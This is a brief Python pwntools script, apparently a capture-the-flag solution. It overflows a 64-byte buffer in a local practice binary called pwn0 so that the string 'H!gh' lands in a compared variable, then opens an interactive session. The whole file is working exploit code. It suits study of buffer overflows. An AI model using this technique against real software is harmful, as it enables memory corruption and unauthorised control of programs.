from pwn import *

garbage = b'A'*64	#64 bytes of garbage for the buffer
josh = b"H!gh"	# the string to compare
payload = garbage + josh

p = process("./pwn0")
p.sendline(payload)
p.interactive()
